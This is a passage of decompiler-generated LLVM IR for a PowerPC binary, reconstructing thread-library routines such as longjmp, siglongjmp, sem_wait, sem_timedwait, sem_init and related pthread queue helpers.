  store i32 0, i32* %v3_10008728, align 4
  br label %dec_label_pc_1000872c

dec_label_pc_1000872c:                            ; preds = %dec_label_pc_10008718, %dec_label_pc_10008708, %dec_label_pc_10008724
  ret i32 %.010

; uselistorder directives
  uselistorder i32 %storemerge20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000872c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008708, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_100086fc, { 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268470108, i32* @lr, align 4
  %v0_10008758 = call i32 @pthread_cleanup_upto()
  %v0_1000875c = load i32, i32* @r29, align 4
  %v0_10008760 = load i32, i32* @r28, align 4
  store i32 268470120, i32* @lr, align 4
  %v2_10008764 = call i32 @_longjmp(i32 %v0_1000875c, i32 %v0_10008760)
  ret i32 %v2_10008764
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268470148, i32* @lr, align 4
  %v0_10008780 = call i32 @pthread_cleanup_upto()
  %v0_10008784 = load i32, i32* @r29, align 4
  %v0_10008788 = load i32, i32* @r28, align 4
  store i32 268470160, i32* @lr, align 4
  %v2_1000878c = call i32 @_longjmp(i32 %v0_10008784, i32 %v0_10008788)
  ret i32 %v2_1000878c

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @enqueue.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0, 3 }
}

define i32 @remove_from_queue.6(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100087e8.pre = load i32, i32* @r3, align 4
  %v1_100087e821 = inttoptr i32 %v0_100087e8.pre to i32*
  %v2_100087e822 = load i32, i32* %v1_100087e821, align 4
  store i32 %v2_100087e822, i32* %r9.global-to-local, align 4
  %v3_100087ec25 = icmp eq i32 %v2_100087e822, 0
  br i1 %v3_100087ec25, label %dec_label_pc_100087f8, label %dec_label_pc_100087c8

dec_label_pc_100087c8:                            ; preds = %entry, %dec_label_pc_100087e4
  %v2_100087e8.pn = phi i32 [ %v2_100087e8, %dec_label_pc_100087e4 ], [ %v2_100087e822, %entry ]
  %v2_100087e830 = phi i32 [ %v2_100087e8, %dec_label_pc_100087e4 ], [ %v2_100087e822, %entry ]
  %v1_100087e829 = phi i32* [ %v1_100087e8, %dec_label_pc_100087e4 ], [ %v1_100087e821, %entry ]
  %v4_100087f035 = icmp eq i32 %v2_100087e8.pn, %arg1
  %v1_100087cc = add i32 %v2_100087e830, 8
  br i1 %v4_100087f035, label %dec_label_pc_100087cc, label %dec_label_pc_100087e4

dec_label_pc_100087cc:                            ; preds = %dec_label_pc_100087c8
  %v2_100087cc = inttoptr i32 %v1_100087cc to i32*
  %v3_100087cc = load i32, i32* %v2_100087cc, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_100087cc, i32* %v1_100087e829, align 4
  %v1_100087dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100087dc = add i32 %v1_100087dc, 8
  %v3_100087dc = inttoptr i32 %v2_100087dc to i32*
  store i32 0, i32* %v3_100087dc, align 4
  %v0_100087fc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100087fc

dec_label_pc_100087e4:                            ; preds = %dec_label_pc_100087c8
  %v1_100087e8 = inttoptr i32 %v1_100087cc to i32*
  %v2_100087e8 = load i32, i32* %v1_100087e8, align 4
  store i32 %v2_100087e8, i32* %r9.global-to-local, align 4
  %v3_100087ec = icmp eq i32 %v2_100087e8, 0
  br i1 %v3_100087ec, label %dec_label_pc_100087f8, label %dec_label_pc_100087c8

dec_label_pc_100087f8:                            ; preds = %dec_label_pc_100087e4, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100087fc

dec_label_pc_100087fc:                            ; preds = %dec_label_pc_100087cc, %dec_label_pc_100087f8
  %v0_100087fc = phi i32 [ %v0_100087fc.pre, %dec_label_pc_100087cc ], [ 0, %dec_label_pc_100087f8 ]
  ret i32 %v0_100087fc

; uselistorder directives
  uselistorder i32 %v2_100087e8, { 2, 3, 0, 1 }
  uselistorder i32* %v1_100087e8, { 1, 0 }
  uselistorder i32 %v1_100087cc, { 1, 0 }
  uselistorder i32 %v2_100087e822, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100087fc, { 1, 0 }
  uselistorder label %dec_label_pc_100087c8, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10008804 = add i32 %arg1, 8
  %v2_10008804 = inttoptr i32 %v1_10008804 to i32*
  %v3_10008804 = load i32, i32* %v2_10008804, align 4
  store i32 %v3_10008804, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.7(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10008814 = call i32 @__asm_mfcr()
  store i32 %v0_10008814, i32* %r3.global-to-local, align 4
  %v3_10008818 = icmp eq i32 %arg2, 0
  store i1 %v3_10008818, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10008814, i32* @r31, align 4
  store i32 %v0_10008814, i32* @r4, align 4
  br i1 %v3_10008818, label %dec_label_pc_10008858, label %dec_label_pc_10008840

dec_label_pc_10008840:                            ; preds = %entry
  %v1_10008840 = add i32 %v0_10008814, 64
  %v2_10008840 = inttoptr i32 %v1_10008840 to i8*
  %v3_10008840 = load i8, i8* %v2_10008840, align 1
  %v3_10008844 = icmp eq i8 %v3_10008840, 0
  br i1 %v3_10008844, label %dec_label_pc_10008858.thread, label %dec_label_pc_10008868

dec_label_pc_10008858.thread:                     ; preds = %dec_label_pc_10008840
  %v2_100088584 = add i32 %v0_10008814, 444
  %v3_100088585 = inttoptr i32 %v2_100088584 to i32*
  store i32 %arg2, i32* %v3_100088585, align 4
  br label %dec_label_pc_10008868

dec_label_pc_10008858:                            ; preds = %entry
  %v1_10008850 = add i32 %v0_10008814, 28
  %v2_10008850 = inttoptr i32 %v1_10008850 to i32*
  %v3_10008850 = load i32, i32* %v2_10008850, align 4
  store i32 %v3_10008850, i32* @r3, align 4
  store i32 268470360, i32* @lr, align 4
  %v0_10008854 = call i32 @__pthread_lock()
  store i32 %v0_10008854, i32* %r3.global-to-local, align 4
  %v0_10008858.pre = load i32, i32* @r30, align 4
  %v1_10008858.pre = load i32, i32* @r31, align 4
  %v0_1000885c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10008858 = add i32 %v1_10008858.pre, 444
  %v3_10008858 = inttoptr i32 %v2_10008858 to i32*
  store i32 %v0_10008858.pre, i32* %v3_10008858, align 4
  br i1 %v0_1000885c.pre, label %dec_label_pc_10008860, label %dec_label_pc_10008868

dec_label_pc_10008860:                            ; preds = %dec_label_pc_10008858
  %v0_10008860 = load i32, i32* @r31, align 4
  %v1_10008860 = add i32 %v0_10008860, 28
  %v2_10008860 = inttoptr i32 %v1_10008860 to i32*
  %v3_10008860 = load i32, i32* %v2_10008860, align 4
  store i32 %v3_10008860, i32* @r3, align 4
  store i32 268470376, i32* @lr, align 4
  %v0_10008864 = call i32 @__pthread_unlock()
  store i32 %v0_10008864, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008868

dec_label_pc_10008868:                            ; preds = %dec_label_pc_10008858.thread, %dec_label_pc_10008858, %dec_label_pc_10008840, %dec_label_pc_10008860
  %v1_10008878 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10008814)
  %v0_10008880 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008880

; uselistorder directives
  uselistorder i32 %v0_10008814, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32 444, { 3, 0, 6, 1, 5, 2, 4 }
  uselistorder label %dec_label_pc_10008868, { 3, 1, 0, 2 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_10008890 = call i32 @__errno_location()
  %v2_10008898 = inttoptr i32 %v0_10008890 to i32*
  store i32 38, i32* %v2_10008898, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_100088bc = call i32 @__errno_location()
  %v2_100088c4 = inttoptr i32 %v0_100088bc to i32*
  store i32 38, i32* %v2_100088c4, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v0_100088e8 = call i32 @__errno_location()
  %v2_100088f0 = inttoptr i32 %v0_100088e8 to i32*
  store i32 38, i32* %v2_100088f0, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10008914 = add i32 %arg1, 12
  %v2_10008914 = inttoptr i32 %v1_10008914 to i32*
  %v3_10008914 = load i32, i32* %v2_10008914, align 4
  %v3_1000891c = icmp eq i32 %v3_10008914, 0
  br i1 %v3_1000891c, label %dec_label_pc_10008934, label %dec_label_pc_10008924

dec_label_pc_10008924:                            ; preds = %entry
  %v0_10008924 = call i32 @__errno_location()
  %v2_1000892c = inttoptr i32 %v0_10008924 to i32*
  store i32 16, i32* %v2_1000892c, align 4
  br label %dec_label_pc_10008934

dec_label_pc_10008934:                            ; preds = %entry, %dec_label_pc_10008924
  %v0_10008940 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_10008924 ]
  ret i32 %v0_10008940

; uselistorder directives
  uselistorder label %dec_label_pc_10008934, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268470624, i32* @lr, align 4
  %v0_1000895c = call i32 @__pthread_lock()
  %v0_10008960 = load i32, i32* @r31, align 4
  %v1_10008960 = add i32 %v0_10008960, 8
  %v2_10008960 = inttoptr i32 %v1_10008960 to i32*
  %v3_10008960 = load i32, i32* %v2_10008960, align 4
  store i32 -1, i32* %r30.global-to-local, align 4
  %v3_10008968 = icmp eq i32 %v3_10008960, 0
  br i1 %v3_10008968, label %dec_label_pc_10008974, label %dec_label_pc_10008984

dec_label_pc_10008974:                            ; preds = %entry
  %v0_10008974 = call i32 @__errno_location()
  %v2_1000897c = inttoptr i32 %v0_10008974 to i32*
  store i32 11, i32* %v2_1000897c, align 4
  br label %dec_label_pc_1000898c

dec_label_pc_10008984:                            ; preds = %entry
  %v1_1000896c = add i32 %v3_10008960, -1
  store i32 %v1_1000896c, i32* %v2_10008960, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000898c

dec_label_pc_1000898c:                            ; preds = %dec_label_pc_10008974, %dec_label_pc_10008984
  %v0_1000898c = load i32, i32* @r31, align 4
  store i32 %v0_1000898c, i32* @r3, align 4
  store i32 268470676, i32* @lr, align 4
  %v0_10008990 = call i32 @__pthread_unlock()
  %v0_10008994 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10008994

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000898c, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp5 = icmp sgt i32 %arg3, -1
  br i1 %tmp5, label %dec_label_pc_100089d4, label %dec_label_pc_100089c4

dec_label_pc_100089c4:                            ; preds = %entry
  %v0_100089c4 = call i32 @__errno_location()
  br label %dec_label_pc_100089e4

dec_label_pc_100089d4:                            ; preds = %entry
  %v3_100089b8 = icmp eq i32 %arg2, 0
  br i1 %v3_100089b8, label %dec_label_pc_100089ec, label %dec_label_pc_100089d8

dec_label_pc_100089d8:                            ; preds = %dec_label_pc_100089d4
  %v0_100089d8 = call i32 @__errno_location()
  br label %dec_label_pc_100089e4

dec_label_pc_100089e4:                            ; preds = %dec_label_pc_100089c4, %dec_label_pc_100089d8
  %storemerge1 = phi i32 [ %v0_100089c4, %dec_label_pc_100089c4 ], [ %v0_100089d8, %dec_label_pc_100089d8 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_100089c4 ], [ 38, %dec_label_pc_100089d8 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100089e4 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_100089e4, align 4
  br label %dec_label_pc_10008a00

dec_label_pc_100089ec:                            ; preds = %dec_label_pc_100089d4
  %v2_100089ec = add i32 %tmp, 12
  %v3_100089ec = inttoptr i32 %v2_100089ec to i32*
  store i32 0, i32* %v3_100089ec, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100089f4 = add i32 %tmp, 8
  %v3_100089f4 = inttoptr i32 %v2_100089f4 to i32*
  store i32 %arg3, i32* %v3_100089f4, align 4
  store i32 0, i32* %arg1, align 4
  %v2_100089fc = add i32 %tmp, 4
  %v3_100089fc = inttoptr i32 %v2_100089fc to i32*
  store i32 0, i32* %v3_100089fc, align 4
  br label %dec_label_pc_10008a00

dec_label_pc_10008a00:                            ; preds = %dec_label_pc_100089e4, %dec_label_pc_100089ec
  %v0_10008a04 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10008a04

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10008a00, { 1, 0 }
  uselistorder label %dec_label_pc_100089e4, { 1, 0 }
}

define i32 @suspend.8(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268470820, i32* @lr, align 4
  %v0_10008a20 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10008a20
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10008a40 = load i32, i32* @r2, align 4
  store i32 %v0_10008a40, i32* @r4, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 268470884, i32* @lr, align 4
  %v0_10008a60 = call i32 @__pthread_lock()
  %v0_10008a64 = load i32, i32* @r31, align 4
  %v1_10008a64 = add i32 %v0_10008a64, 8
  %v2_10008a64 = inttoptr i32 %v1_10008a64 to i32*
  %v3_10008a64 = load i32, i32* %v2_10008a64, align 4
  %tmp12 = icmp slt i32 %v3_10008a64, 1
  br i1 %tmp12, label %dec_label_pc_10008a84, label %dec_label_pc_10008a70

dec_label_pc_10008a70:                            ; preds = %entry
  %v1_10008a70 = add i32 %v3_10008a64, -1
  store i32 %v0_10008a64, i32* @r3, align 4
  store i32 %v1_10008a70, i32* %v2_10008a64, align 4
  store i32 ptrtoint (i32* @global_var_10008a80.330 to i32), i32* @lr, align 4
  %v0_10008a7c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10008b70

dec_label_pc_10008a84:                            ; preds = %entry
  %v2_10008a8c = ptrtoint i32* %stack_var_-20 to i32
  %v3_10008a90 = add i32 %v0_10008a40, 442
  %v4_10008a90 = inttoptr i32 %v3_10008a90 to i8*
  store i8 0, i8* %v4_10008a90, align 1
  store i32 268470940, i32* @lr, align 4
  %v2_10008a98 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008a40, i32 %v2_10008a8c)
  %v1_10008aa0 = add i32 %v0_10008a40, 66
  %v2_10008aa0 = inttoptr i32 %v1_10008aa0 to i8*
  %v3_10008aa0 = load i8, i8* %v2_10008aa0, align 1
  %v3_10008aa4 = icmp eq i8 %v3_10008aa0, 0
  br i1 %v3_10008aa4, label %dec_label_pc_10008ac0, label %dec_label_pc_10008aac

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008a84
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_10008ab4 = add i32 %v0_10008a40, 64
  %v2_10008ab4 = inttoptr i32 %v1_10008ab4 to i8*
  %v3_10008ab4 = load i8, i8* %v2_10008ab4, align 1
  %v3_10008ab8 = icmp eq i8 %v3_10008ab4, 0
  br i1 %v3_10008ab8, label %dec_label_pc_10008ad0, label %dec_label_pc_10008ac0

dec_label_pc_10008ac0:                            ; preds = %dec_label_pc_10008aac, %dec_label_pc_10008a84
  %v0_10008ac4 = load i32, i32* @r31, align 4
  %v1_10008ac4 = add i32 %v0_10008ac4, 12
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10008acc = call i32 @enqueue.5(i32 %v1_10008ac4, i32 %v0_10008a40)
  br label %dec_label_pc_10008ad0

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10008aac, %dec_label_pc_10008ac0
  %v0_10008ad0 = load i32, i32* @r31, align 4
  store i32 %v0_10008ad0, i32* @r3, align 4
  store i32 268471000, i32* @lr, align 4
  %v0_10008ad4 = call i32 @__pthread_unlock()
  %v0_10008ad8 = load i32, i32* %r30.global-to-local, align 4
  %v3_10008ad8 = icmp eq i32 %v0_10008ad8, 0
  store i32 %v0_10008a40, i32* @r3, align 4
  br i1 %v3_10008ad8, label %dec_label_pc_10008af8.preheader, label %dec_label_pc_10008ae0

dec_label_pc_10008af8.preheader:                  ; preds = %dec_label_pc_10008ad0
  store i32 268471040, i32* @lr, align 4
  %v1_10008afc1 = call i32 @suspend.8(i32 %v0_10008a40)
  %v3_10008b042 = load i8, i8* %v4_10008a90, align 1
  %v3_10008b085 = icmp eq i8 %v3_10008b042, 0
  %v1_10008b14 = add i32 %v0_10008a40, 440
  %v2_10008b14 = inttoptr i32 %v1_10008b14 to i8*
  br i1 %v3_10008b085, label %dec_label_pc_10008b10.lr.ph, label %dec_label_pc_10008b30

dec_label_pc_10008b10.lr.ph:                      ; preds = %dec_label_pc_10008af8.preheader
  %v1_10008b24 = add i32 %v0_10008a40, 64
  %v2_10008b24 = inttoptr i32 %v1_10008b24 to i8*
  br label %dec_label_pc_10008b10

dec_label_pc_10008ae0:                            ; preds = %dec_label_pc_10008ad0
  store i32 268471020, i32* @lr, align 4
  %v2_10008ae8 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008a40, i32 0)
  br label %dec_label_pc_10008b6c

dec_label_pc_10008b10:                            ; preds = %dec_label_pc_10008b10.lr.ph, %dec_label_pc_10008af8.backedge
  %v3_10008b14 = load i8, i8* %v2_10008b14, align 1
  %v3_10008b18 = icmp eq i8 %v3_10008b14, 0
  br i1 %v3_10008b18, label %dec_label_pc_10008af8.backedge, label %dec_label_pc_10008b20

dec_label_pc_10008af8.backedge:                   ; preds = %dec_label_pc_10008b10, %dec_label_pc_10008b20
  store i32 %v0_10008a40, i32* @r3, align 4
  store i32 268471040, i32* @lr, align 4
  %v1_10008afc = call i32 @suspend.8(i32 %v0_10008a40)
  %v3_10008b04 = load i8, i8* %v4_10008a90, align 1
  %v3_10008b08 = icmp eq i8 %v3_10008b04, 0
  br i1 %v3_10008b08, label %dec_label_pc_10008b10, label %dec_label_pc_10008b30

dec_label_pc_10008b20:                            ; preds = %dec_label_pc_10008b10
  %v3_10008b24 = load i8, i8* %v2_10008b24, align 1
  %v3_10008b28 = icmp eq i8 %v3_10008b24, 0
  br i1 %v3_10008b28, label %dec_label_pc_10008b30, label %dec_label_pc_10008af8.backedge

dec_label_pc_10008b30:                            ; preds = %dec_label_pc_10008af8.backedge, %dec_label_pc_10008b20, %dec_label_pc_10008af8.preheader
  store i32 268471100, i32* @lr, align 4
  %v2_10008b38 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008a40, i32 0)
  %v3_10008b40 = load i8, i8* %v2_10008b14, align 1
  %v3_10008b44 = icmp eq i8 %v3_10008b40, 0
  br i1 %v3_10008b44, label %dec_label_pc_10008b70, label %dec_label_pc_10008b4c

dec_label_pc_10008b4c:                            ; preds = %dec_label_pc_10008b30
  %v1_10008b50 = add i32 %v0_10008a40, 64
  %v2_10008b50 = inttoptr i32 %v1_10008b50 to i8*
  %v3_10008b50 = load i8, i8* %v2_10008b50, align 1
  %v3_10008b54 = icmp eq i8 %v3_10008b50, 0
  br i1 %v3_10008b54, label %dec_label_pc_10008b5c, label %dec_label_pc_10008b70

dec_label_pc_10008b5c:                            ; preds = %dec_label_pc_10008b4c
  store i8 0, i8* %v2_10008b14, align 1
  br label %dec_label_pc_10008b6c

dec_label_pc_10008b6c:                            ; preds = %dec_label_pc_10008ae0, %dec_label_pc_10008b5c
  %v0_10008b6c = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10008b70

dec_label_pc_10008b70:                            ; preds = %dec_label_pc_10008b4c, %dec_label_pc_10008b30, %dec_label_pc_10008a70, %dec_label_pc_10008b6c
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_10008a90, { 1, 0, 2 }
  uselistorder i32 %v0_10008a40, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13, 14 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 268471040, { 1, 0 }
  uselistorder label %dec_label_pc_10008b70, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008b6c, { 1, 0 }
  uselistorder label %dec_label_pc_10008b30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008af8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10008b10, { 1, 0 }
  uselistorder label %dec_label_pc_10008ad0, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10008b90 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10008b90, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268471212, i32* @lr, align 4
  %v0_10008ba8 = call i32 @__pthread_lock()
  %v0_10008bac = load i32, i32* @r29, align 4
  %v1_10008bb0 = add i32 %arg1, 12
  store i32 %v1_10008bb0, i32* @r3, align 4
  %v2_10008bb4 = call i32 @remove_from_queue.6(i32 %v1_10008bb0, i32 %v0_10008bac)
  %v0_10008bbc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10008bbc, i32* @r3, align 4
  store i32 268471236, i32* @lr, align 4
  %v0_10008bc0 = call i32 @__pthread_unlock()
  ret i32 %v2_10008bb4
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v0_10008bf0 = load i32, i32* @r2, align 4
  store i32 %v0_10008bf0, i32* @r4, align 4
  store i32 268471296, i32* @lr, align 4
  %v0_10008bfc = call i32 @__pthread_lock()
  %v0_10008c00 = load i32, i32* @r30, align 4
  %v1_10008c00 = add i32 %v0_10008c00, 8
  %v2_10008c00 = inttoptr i32 %v1_10008c00 to i32*
  %v3_10008c00 = load i32, i32* %v2_10008c00, align 4
  store i32 %v3_10008c00, i32* %r9.global-to-local, align 4
  %tmp10 = icmp slt i32 %v3_10008c00, 1
  br i1 %tmp10, label %dec_label_pc_10008c20, label %dec_label_pc_10008c0c

dec_label_pc_10008c0c:                            ; preds = %entry
  %v1_10008c0c = add i32 %v3_10008c00, -1
  store i32 %v0_10008c00, i32* @r3, align 4
  store i32 %v1_10008c0c, i32* %v2_10008c00, align 4
  store i32 ptrtoint (i32* @global_var_10008c1c.331 to i32), i32* @lr, align 4
  %v0_10008c18 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10008d84

dec_label_pc_10008c20:                            ; preds = %entry
  %v0_10008c24 = load i32, i32* @r28, align 4
  %v1_10008c24 = add i32 %v0_10008c24, 4
  %v2_10008c24 = inttoptr i32 %v1_10008c24 to i32*
  %v3_10008c24 = load i32, i32* %v2_10008c24, align 4
  store i32 %v3_10008c24, i32* %r9.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_10008c24, 1000000000
  br i1 %tmp11, label %dec_label_pc_10008c4c, label %dec_label_pc_10008c34

dec_label_pc_10008c34:                            ; preds = %dec_label_pc_10008c20
  store i32 %v0_10008c00, i32* @r3, align 4
  store i32 268471356, i32* @lr, align 4
  %v0_10008c38 = call i32 @__pthread_unlock()
  %v0_10008c3c = call i32 @__errno_location()
  br label %dec_label_pc_10008d7c

dec_label_pc_10008c4c:                            ; preds = %dec_label_pc_10008c20
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -29816), i32* %r9.global-to-local, align 4
  store i32 %v0_10008c00, i32* %stack_var_-40, align 4
  %v0_10008c60 = load i32, i32* @r31, align 4
  %v3_10008c64 = add i32 %v0_10008c60, 442
  %v4_10008c64 = inttoptr i32 %v3_10008c64 to i8*
  store i8 0, i8* %v4_10008c64, align 1
  %v2_10008c68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268471408, i32* @lr, align 4
  %v2_10008c6c = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008c60, i32 %v2_10008c68)
  %v0_10008c70 = load i32, i32* @r31, align 4
  %v1_10008c70 = add i32 %v0_10008c70, 66
  %v2_10008c70 = inttoptr i32 %v1_10008c70 to i8*
  %v3_10008c70 = load i8, i8* %v2_10008c70, align 1
  %v3_10008c74 = icmp eq i8 %v3_10008c70, 0
  br i1 %v3_10008c74, label %dec_label_pc_10008c8c, label %dec_label_pc_10008c7c

dec_label_pc_10008c7c:                            ; preds = %dec_label_pc_10008c4c
  %v1_10008c7c = add i32 %v0_10008c70, 64
  %v2_10008c7c = inttoptr i32 %v1_10008c7c to i8*
  %v3_10008c7c = load i8, i8* %v2_10008c7c, align 1
  store i32 1, i32* @r29, align 4
  %v3_10008c84 = icmp eq i8 %v3_10008c7c, 0
  br i1 %v3_10008c84, label %dec_label_pc_10008c9c, label %dec_label_pc_10008c8c

dec_label_pc_10008c8c:                            ; preds = %dec_label_pc_10008c7c, %dec_label_pc_10008c4c
  %v0_10008c8c = load i32, i32* @r30, align 4
  %v1_10008c8c = add i32 %v0_10008c8c, 12
  %v2_10008c94 = call i32 @enqueue.5(i32 %v1_10008c8c, i32 %v0_10008c70)
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10008c9c

dec_label_pc_10008c9c:                            ; preds = %dec_label_pc_10008c7c, %dec_label_pc_10008c8c
  %v0_10008c9c = load i32, i32* @r30, align 4
  store i32 %v0_10008c9c, i32* @r3, align 4
  store i32 268471460, i32* @lr, align 4
  %v0_10008ca0 = call i32 @__pthread_unlock()
  %v0_10008ca4 = load i32, i32* @r29, align 4
  %v3_10008ca4 = icmp eq i32 %v0_10008ca4, 0
  %v0_10008cc4.pre = load i32, i32* @r31, align 4
  br i1 %v3_10008ca4, label %dec_label_pc_10008cc4, label %dec_label_pc_10008cac

dec_label_pc_10008cac:                            ; preds = %dec_label_pc_10008c9c
  store i32 268471480, i32* @lr, align 4
  %v2_10008cb4 = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10008cc4.pre, i32 0)
  br label %dec_label_pc_10008d60

dec_label_pc_10008cc4:                            ; preds = %dec_label_pc_10008d24, %dec_label_pc_10008d18, %dec_label_pc_10008c9c
  %v0_10008cc4 = phi i32 [ %v0_10008cc4.pre, %dec_label_pc_10008c9c ], [ %v0_10008d0c, %dec_label_pc_10008d18 ], [ %v0_10008d0c, %dec_label_pc_10008d24 ]
  %v0_10008cc8 = load i32, i32* @r28, align 4
  store i32 268471504, i32* @lr, align 4
  %v2_10008ccc = inttoptr i32 %v0_10008cc8 to i32*
  %v3_10008ccc = call i32 @__pthread_timedsuspend_new(i32 %v0_10008cc4, i32* %v2_10008ccc)
  %v3_10008cd0 = icmp eq i32 %v3_10008ccc, 0
  br i1 %v3_10008cd0, label %dec_label_pc_10008cd8, label %dec_label_pc_10008d0c

dec_label_pc_10008cd8:                            ; preds = %dec_label_pc_10008cc4
  %v0_10008cd8 = load i32, i32* @r30, align 4
  store i32 %v0_10008cd8, i32* @r3, align 4
  %v0_10008cdc = load i32, i32* @r31, align 4
  store i32 %v0_10008cdc, i32* @r4, align 4
  store i32 268471524, i32* @lr, align 4
  %v0_10008ce0 = call i32 @__pthread_lock()
  %v0_10008ce4 = load i32, i32* @r31, align 4
  %v0_10008ce8 = load i32, i32* @r30, align 4
  %v1_10008ce8 = add i32 %v0_10008ce8, 12
  store i32 %v1_10008ce8, i32* @r3, align 4
  %v2_10008cec = call i32 @remove_from_queue.6(i32 %v1_10008ce8, i32 %v0_10008ce4)
  %v0_10008cf4 = load i32, i32* @r30, align 4
  store i32 %v0_10008cf4, i32* @r3, align 4
  store i32 268471548, i32* @lr, align 4
  %v0_10008cf8 = call i32 @__pthread_unlock()
  %v3_10008cfc = icmp eq i32 %v2_10008cec, 0
  br i1 %v3_10008cfc, label %dec_label_pc_10008d04, label %dec_label_pc_10008d64

